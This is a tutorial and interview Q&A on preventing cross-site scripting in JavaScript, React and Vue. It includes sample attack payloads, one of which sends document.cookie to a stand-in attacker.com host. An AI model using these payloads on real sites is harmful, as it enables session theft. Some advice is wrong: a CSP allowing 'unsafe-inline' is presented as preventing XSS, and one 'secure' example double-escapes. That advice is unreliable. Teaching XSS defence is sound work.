# XSS Prevention: Cross-Site Scripting Defense

Cross-Site Scripting (XSS) is a security vulnerability where attackers inject malicious scripts. Understanding XSS prevention is crucial for secure applications.

## What is XSS?

**XSS** allows attackers to inject malicious scripts into web pages viewed by users.

### Types of XSS

1. **Stored XSS**: Malicious script stored in database
2. **Reflected XSS**: Malicious script in URL/input
3. **DOM-based XSS**: Client-side script manipulation

## XSS Prevention

### Sanitize Input

```javascript
// ❌ Dangerous: Direct innerHTML
element.innerHTML = userInput;  // XSS vulnerability!

// ✅ Safe: Sanitize input
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// ✅ Better: Use textContent
element.textContent = userInput;
```

### Escape Output

```javascript
function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}

// Use
element.innerHTML = escapeHtml(userInput);
```

## React XSS Prevention

```javascript
// React automatically escapes
function UserProfile({ name }) {
    return <div>{name}</div>;  // Automatically escaped
}

// ❌ Dangerous: dangerouslySetInnerHTML
function UserProfile({ html }) {
    return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// ✅ Safe: Sanitize first
import DOMPurify from 'dompurify';

function UserProfile({ html }) {
    const cleanHtml = DOMPurify.sanitize(html);
    return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}
```

## Vue XSS Prevention

```vue
<!-- Vue automatically escapes -->
<template>
    <div>{{ userInput }}</div>  <!-- Automatically escaped -->
</template>

<!-- ❌ Dangerous: v-html -->
<div v-html="userInput"></div>

<!-- ✅ Safe: Sanitize first -->
<div v-html="sanitizedInput"></div>

<script>
import DOMPurify from 'dompurify';

const sanitizedInput = computed(() => {
    return DOMPurify.sanitize(userInput.value);
});
</script>
```

## Content Security Policy (CSP)

```html
<!-- CSP header prevents XSS -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'unsafe-inline';">
```

## Best Practices

1. **Sanitize Input**: Always sanitize user input
2. **Escape Output**: Escape when rendering
3. **Use textContent**: Prefer over innerHTML
4. **CSP**: Implement Content Security Policy
5. **Validate**: Validate input on server

## Summary

**XSS Prevention:**

1. **Sanitize**: Clean user input
2. **Escape**: Escape output
3. **CSP**: Content Security Policy
4. **Frameworks**: Use framework escaping
5. **Validation**: Validate on server

**Key Takeaway:**
XSS allows attackers to inject malicious scripts. Prevent by sanitizing input, escaping output, and using Content Security Policy. React and Vue automatically escape, but be careful with dangerouslySetInnerHTML and v-html. Always validate on server side.

**XSS Strategy:**
- Sanitize input
- Escape output
- Use CSP
- Framework escaping
- Server validation

**Next Steps:**
- Learn [CSRF Prevention](csrf_prevention.md) for attacks
- Study [CORS](cors_configuration.md) for cross-origin
- Master [Security Best Practices](security_best_practices.md) for comprehensive security

---

## 🎯 Interview Questions: Frontend

### Q1: Explain XSS (Cross-Site Scripting) attacks in detail, including different types of XSS, how they work, and comprehensive prevention strategies. Provide examples showing vulnerable code and secure implementations.

**Answer:**

**XSS Definition:**

Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts execute in the victim's browser context, potentially stealing data, hijacking sessions, or performing actions on behalf of the user.

**How XSS Works:**

**Attack Flow:**
```
1. Attacker injects malicious script
2. Script stored in database/URL/DOM
3. Victim visits page
4. Malicious script executes in victim's browser
5. Script has access to:
   - Cookies (session tokens)
   - Local storage
   - DOM
   - User input
   - API calls
```

**Types of XSS:**

**1. Stored XSS (Persistent XSS):**

**How It Works:**
- Malicious script stored in database
- Executes when page loads
- Affects all users viewing the page

**Example:**
```javascript
// Vulnerable code
function displayComment(comment) {
    document.getElementById('comments').innerHTML += 
        '<div>' + comment + '</div>';
}

// Attacker input:
// <script>alert(document.cookie)</script>
// or
// <img src=x onerror="alert(document.cookie)">

// Result: Script executes, cookies stolen
```

**2. Reflected XSS (Non-Persistent XSS):**

**How It Works:**
- Malicious script in URL/input
- Reflected in response
- Executes when page loads

**Example:**
```javascript
// Vulnerable code
const searchQuery = new URLSearchParams(window.location.search).get('q');
document.getElementById('results').innerHTML = 
    'Search results for: ' + searchQuery;

// Attacker URL:
// https://example.com/search?q=<script>alert(document.cookie)</script>

// Result: Script executes
```

**3. DOM-based XSS:**

**How It Works:**
- Malicious script manipulates DOM
- No server involvement
- Client-side vulnerability

**Example:**
```javascript
// Vulnerable code
const hash = window.location.hash.substring(1);
document.getElementById('content').innerHTML = hash;

// Attacker URL:
// https://example.com/#<img src=x onerror="alert(document.cookie)">

// Result: Script executes
```

**XSS Prevention Strategies:**

**1. Input Sanitization:**

**DOMPurify Library:**
```javascript
import DOMPurify from 'dompurify';

// Sanitize user input
const userInput = '<script>alert("XSS")</script><p>Safe content</p>';
const clean = DOMPurify.sanitize(userInput);
// Result: '<p>Safe content</p>' (script removed)

// Use sanitized content
element.innerHTML = clean;
```

**2. Output Escaping:**

**HTML Escaping:**
```javascript
function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}

// Use
const userInput = '<script>alert("XSS")</script>';
element.innerHTML = escapeHtml(userInput);
// Result: '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;'
// Renders as text, not executed
```

**3. Use textContent Instead of innerHTML:**
```javascript
// ❌ Dangerous
element.innerHTML = userInput;  // Executes scripts

// ✅ Safe
element.textContent = userInput;  // Escapes automatically
```

**4. Content Security Policy (CSP):**

**CSP Header:**
```html
<!-- Strict CSP -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self'; 
               style-src 'self' 'unsafe-inline'; 
               img-src 'self' data: https:;">

<!-- Prevents inline scripts -->
<!-- Prevents eval() -->
<!-- Prevents external scripts -->
```

**CSP Directives:**
```javascript
// default-src 'self': Only same-origin resources
// script-src 'self': Only same-origin scripts
// style-src 'self' 'unsafe-inline': Same-origin styles, allow inline
// img-src 'self' data: https:: Same-origin images, data URIs, HTTPS
```

**5. Framework Protection:**

**React:**
```javascript
// ✅ React automatically escapes
function UserProfile({ name }) {
    return <div>{name}</div>;  // Automatically escaped
}

// ❌ Dangerous: dangerouslySetInnerHTML
function UserProfile({ html }) {
    return <div dangerouslySetInnerHTML={{ __html: html }} />;
    // XSS vulnerability!
}

// ✅ Safe: Sanitize first
import DOMPurify from 'dompurify';

function UserProfile({ html }) {
    const cleanHtml = DOMPurify.sanitize(html);
    return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}
```

**Vue:**
```vue
<!-- ✅ Vue automatically escapes -->
<template>
    <div>{{ userInput }}</div>  <!-- Automatically escaped -->
</template>

<!-- ❌ Dangerous: v-html -->
<div v-html="userInput"></div>

<!-- ✅ Safe: Sanitize first -->
<div v-html="sanitizedInput"></div>

<script>
import DOMPurify from 'dompurify';

const sanitizedInput = computed(() => {
    return DOMPurify.sanitize(userInput.value);
});
</script>
```

**6. Server-Side Validation:**

**Input Validation:**
```javascript
// Server-side validation
function validateInput(input) {
    // Remove HTML tags
    const cleaned = input.replace(/<[^>]*>/g, '');
    
    // Validate length
    if (cleaned.length > 1000) {
        throw new Error('Input too long');
    }
    
    // Validate format
    if (!/^[a-zA-Z0-9\s.,!?]+$/.test(cleaned)) {
        throw new Error('Invalid characters');
    }
    
    return cleaned;
}
```

**7. HTTP-Only Cookies:**
```javascript
// Set HTTP-only cookies
// Prevents JavaScript access
res.cookie('session', token, {
    httpOnly: true,  // Not accessible via JavaScript
    secure: true,    // HTTPS only
    sameSite: 'strict'
});

// Even if XSS occurs, cookies cannot be stolen via JavaScript
```

**Real-World Examples:**

**Example 1: Comment System**

**Vulnerable:**
```javascript
// ❌ Vulnerable
function addComment(comment) {
    const div = document.createElement('div');
    div.innerHTML = comment;  // XSS vulnerability!
    document.getElementById('comments').appendChild(div);
}

// Attacker input:
// <img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

**Secure:**
```javascript
// ✅ Secure
import DOMPurify from 'dompurify';

function addComment(comment) {
    const div = document.createElement('div');
    const clean = DOMPurify.sanitize(comment);  // Sanitize
    div.innerHTML = clean;
    document.getElementById('comments').appendChild(div);
}

// Or use textContent
function addComment(comment) {
    const div = document.createElement('div');
    div.textContent = comment;  // Automatically escaped
    document.getElementById('comments').appendChild(div);
}
```

**Example 2: Search Results**

**Vulnerable:**
```javascript
// ❌ Vulnerable
const query = new URLSearchParams(location.search).get('q');
document.getElementById('results').innerHTML = 
    `Results for: ${query}`;  // XSS vulnerability!

// Attacker URL:
// ?q=<script>alert(document.cookie)</script>
```

**Secure:**
```javascript
// ✅ Secure
const query = new URLSearchParams(location.search).get('q');
const escaped = escapeHtml(query);  // Escape
document.getElementById('results').textContent = 
    `Results for: ${escaped}`;
```

**Example 3: User Profile**

**Vulnerable:**
```javascript
// ❌ Vulnerable
function displayProfile(user) {
    document.getElementById('name').innerHTML = user.name;
    document.getElementById('bio').innerHTML = user.bio;
    // XSS if user.name or user.bio contains scripts
}
```

**Secure:**
```javascript
// ✅ Secure
import DOMPurify from 'dompurify';

function displayProfile(user) {
    document.getElementById('name').textContent = user.name;
    document.getElementById('bio').innerHTML = DOMPurify.sanitize(user.bio);
}
```

**Best Practices:**

**1. Never Trust User Input:**
```javascript
// ✅ Always sanitize/escape
const clean = DOMPurify.sanitize(userInput);
```

**2. Use textContent When Possible:**
```javascript
// ✅ Prefer textContent
element.textContent = userInput;

// ⚠️ Only use innerHTML if necessary, and sanitize
element.innerHTML = DOMPurify.sanitize(userInput);
```

**3. Implement CSP:**
```html
<!-- ✅ Strict CSP -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self';">
```

**4. Validate on Server:**
```javascript
// ✅ Server-side validation
// Don't rely only on client-side
```

**5. Use HTTP-Only Cookies:**
```javascript
// ✅ Prevent JavaScript access to cookies
httpOnly: true
```

**6. Framework Protection:**
```javascript
// ✅ Use framework's built-in escaping
// React, Vue automatically escape
```

**System Design Consideration**: XSS prevention is critical for:
1. **Security**: Protecting user data
2. **Trust**: Maintaining user trust
3. **Compliance**: Meeting security standards
4. **Reputation**: Preventing security breaches

XSS attacks inject malicious scripts into web pages. Prevention requires input sanitization, output escaping, Content Security Policy, and proper use of framework protections. Never trust user input, always sanitize or escape, and implement defense in depth with multiple layers of protection.

